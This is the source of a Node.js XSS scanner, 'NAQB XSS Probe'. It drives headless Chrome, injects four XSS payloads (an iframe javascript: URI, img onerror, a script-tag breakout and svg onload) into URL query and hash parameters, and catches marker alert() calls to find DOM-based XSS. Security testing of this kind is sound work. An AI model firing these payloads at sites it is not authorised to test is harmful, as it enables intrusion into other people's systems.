#!/usr/bin/env node
// NAQB XSS Probe (native). Runs directly on the host — no Docker.
//
// Why native: the Dockerised version of this tool was unreliable on this machine. Root-caused with
// real evidence (instrumented logging + Chrome's own stderr via `dumpio`, not guesses): Chrome's
// crashpad crash-handler cannot start at all under a --read-only container root filesystem, and one
// payload (a dynamically-injected <script> tag) reliably triggered a renderer-level fault that then
// hung forever because crashpad itself failed to report it. Running natively removes read-only
// roots, capability drops and cgroup restrictions entirely — the exact things that were conflicting
// with Chrome's own crash-handling — rather than trying to out-flag a third-party browser's internals.
//
// Why this still finds real bugs: it runs a REAL browser against the REAL target and watches for a
// REAL JavaScript alert()/confirm()/prompt() call carrying a unique per-test marker. It does not use
// Chrome's native dialog (that goes through a CDP event that races with navigation); alert/confirm/
// prompt are overridden IN-PAGE, before any page script runs, so there is no native dialog and
// nothing to race on. This is how it catches DOM-based XSS — payload only ever appears in the DOM
// after client-side JS (Angular/React/Vue) inserts it, never in any HTTP response body — which a
// classic HTTP-response-scanning active scanner (e.g. ZAP's reflected/persistent XSS rules) cannot
// see at all.
//
// Usage: node detect.mjs <target-url> [--json=<path>]
import puppeteer from 'puppeteer-core'
import { randomUUID } from 'node:crypto'
import { existsSync, writeFileSync } from 'node:fs'
import { pathToFileURL } from 'node:url'

const PAYLOADS = [
  { name: 'iframe javascript: URI', make: (m) => `<iframe src="javascript:alert('${m}')">` },
  { name: 'img onerror', make: (m) => `<img src=x onerror="alert('${m}')">` },
  { name: 'script tag injection', make: (m) => `"><script>alert('${m}')</script>` },
  { name: 'svg onload', make: (m) => `<svg onload="alert('${m}')">` },
]
const NAV_TIMEOUT_MS = 10_000
const SETTLE_MS = 2_500
const TEST_HARD_TIMEOUT_MS = 15_000 // safety net: must exceed NAV_TIMEOUT_MS + SETTLE_MS with margin
// Bounds worst-case runtime (e.g. a target with many query params) to a predictable ceiling.
const MAX_TESTS = 24

export function findChrome() {
  if (process.env.NAQB_CHROME_PATH && existsSync(process.env.NAQB_CHROME_PATH)) return process.env.NAQB_CHROME_PATH
  const candidates = [
    'C:/Program Files/Google/Chrome/Application/chrome.exe',
    'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
    'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
    '/usr/bin/google-chrome', '/usr/bin/chromium-browser', '/usr/bin/chromium',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  ]
  const found = candidates.find(existsSync)
  if (!found) throw new Error('No Chrome/Edge install found. Set NAQB_CHROME_PATH to a browser executable.')
  return found
}

/** Query params to try, from the normal query string AND a `#/path?a=b`-style SPA hash route
 *  (Angular/Vue/old-style apps often fake a query string inside the fragment, e.g. Juice Shop). */
export function candidateParams(url) {
  const u = new URL(url)
  const out = []
  for (const k of u.searchParams.keys()) out.push({ location: 'search', key: k })
  const hashQ = u.hash.includes('?') ? u.hash.slice(u.hash.indexOf('?') + 1) : ''
  for (const k of new URLSearchParams(hashQ).keys()) out.push({ location: 'hash', key: k })
  if (out.length === 0) {
    out.push({ location: 'search-guess', key: 'q' })
    out.push({ location: 'hash-guess', key: 'q' })
  }
  return [...new Map(out.map((o) => [`${o.location}:${o.key}`, o])).values()]
}

export function buildUrl(target, cand, payload) {
  const u = new URL(target)
  if (cand.location === 'search') { u.searchParams.set(cand.key, payload); return u.href }
  if (cand.location === 'search-guess') { u.search = `?${cand.key}=${encodeURIComponent(payload)}`; return u.href }
  const base = u.hash.includes('?') ? u.hash.slice(0, u.hash.indexOf('?')) : (u.hash || '#/search')
  const hq = new URLSearchParams(u.hash.includes('?') ? u.hash.slice(u.hash.indexOf('?') + 1) : '')
  hq.set(cand.key, payload)
  u.hash = `${base}?${hq.toString()}`
  return u.href
}

async function installOverride(page) {
  await page.evaluateOnNewDocument(() => {
    window.__naqb = window.__naqb || []
    const record = (type) => (msg) => { window.__naqb.push({ type, message: String(msg) }); return type === 'confirm' }
    window.alert = record('alert')
    window.confirm = record('confirm')
    window.prompt = record('prompt')
  })
}

/** One test under a hard deadline. Never throws. Returns {outcome:'fired'|'clean'|'error', ...}. */
async function runOneTest(page, testUrl, marker) {
  const work = (async () => {
    await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: NAV_TIMEOUT_MS })
    await new Promise((r) => setTimeout(r, SETTLE_MS))
    // The payload may fire inside an <iframe>'s own document (its own `window`), not the top page's.
    for (const f of page.frames()) {
      try {
        const hit = await f.evaluate((m) => (window.__naqb ?? []).find((h) => h.message.includes(m)), marker)
        if (hit) return { outcome: 'fired', evidence: hit }
      } catch { /* frame not readable (detached, javascript: context, etc.): not a failure */ }
    }
    return { outcome: 'clean' }
  })()
  try {
    return await Promise.race([
      work,
      new Promise((_, rej) => setTimeout(() => rej(new Error(`no result within ${TEST_HARD_TIMEOUT_MS}ms`)), TEST_HARD_TIMEOUT_MS)),
    ])
  } catch (e) {
    return { outcome: 'error', error: String(e?.message ?? e).slice(0, 200) }
  }
}

/** Runs the full probe against `target`. Returns {target, tested, findings, inconclusive}. */
export async function probe(target, { chromePath = findChrome(), log = () => {} } = {}) {
  const browser = await puppeteer.launch({
    executablePath: chromePath,
    headless: true,
    args: ['--disable-popup-blocking', '--no-first-run', '--no-default-browser-check'],
  })
  const page = await browser.newPage()
  await installOverride(page)

  const findings = []
  const inconclusive = []
  let tested = 0
  try {
    outer:
    for (const cand of candidateParams(target)) {
      for (const { name, make } of PAYLOADS) {
        if (tested >= MAX_TESTS) break outer
        tested++
        const marker = `naqb-xss-${randomUUID().slice(0, 8)}`
        const payload = make(marker)
        const testUrl = buildUrl(target, cand, payload)
        log(`[${tested}] ${name} on ${cand.location}:${cand.key} ...`)
        const result = await runOneTest(page, testUrl, marker)
        if (result.outcome === 'fired') {
          log(`    FIRED — alert('${result.evidence.message}') executed`)
          findings.push({ name, location: cand.location, param: cand.key, payload, url: testUrl, evidence: result.evidence })
        } else if (result.outcome === 'error') {
          log(`    inconclusive: ${result.error}`)
          inconclusive.push({ name, location: cand.location, param: cand.key, payload, url: testUrl, reason: result.error })
        } else {
          log(`    clean`)
        }
      }
    }
  } finally {
    await page.close().catch(() => {})
    await browser.close().catch(() => {})
  }
  return { target, tested, findings, inconclusive }
}

function printReport(result) {
  console.log(`\nNAQB XSS Probe — ${result.target}`)
  console.log(`${result.tested} test(s) run, ${result.findings.length} finding(s), ${result.inconclusive.length} inconclusive\n`)
  if (result.findings.length === 0) {
    console.log('No XSS findings.')
  } else {
    for (const f of result.findings) {
      console.log(`✖ ${f.name} — parameter "${f.param}" (${f.location})`)
      console.log(`    payload : ${f.payload}`)
      console.log(`    url     : ${f.url}`)
      console.log(`    evidence: window.${f.evidence.type}("${f.evidence.message}") executed in the browser\n`)
    }
  }
  if (result.inconclusive.length > 0) {
    console.log(`${result.inconclusive.length} test(s) could not be completed (not counted as clean or vulnerable):`)
    for (const i of result.inconclusive) console.log(`  - ${i.name} on ${i.param}: ${i.reason}`)
  }
}

if (import.meta.url === pathToFileURL(process.argv[1]).href) {
  const target = process.argv[2]
  if (!target) { console.error('usage: node detect.mjs <target-url> [--json=<path>] [--quiet]'); process.exit(2) }
  const jsonArg = process.argv.find((a) => a.startsWith('--json='))
  // --quiet: used by the NAQB worker. Prints progress to stderr (so it still shows up as live job
  // output) and exactly ONE JSON object to stdout — nothing else — matching every other NAQB tool's
  // output contract, so the exact same worker/parser pipeline can run it.
  const quiet = process.argv.includes('--quiet')
  const result = await probe(target, { log: (s) => (quiet ? console.error(s) : console.log(s)) })
  if (quiet) console.log(JSON.stringify(result))
  else printReport(result)
  if (jsonArg) {
    writeFileSync(jsonArg.slice('--json='.length), JSON.stringify(result, null, 2))
    if (!quiet) console.log(`\nFull result: ${jsonArg.slice('--json='.length)}`)
  }
  process.exit(0) // detection tool: exit 0 either way, the report/JSON is the answer, not the exit code
}
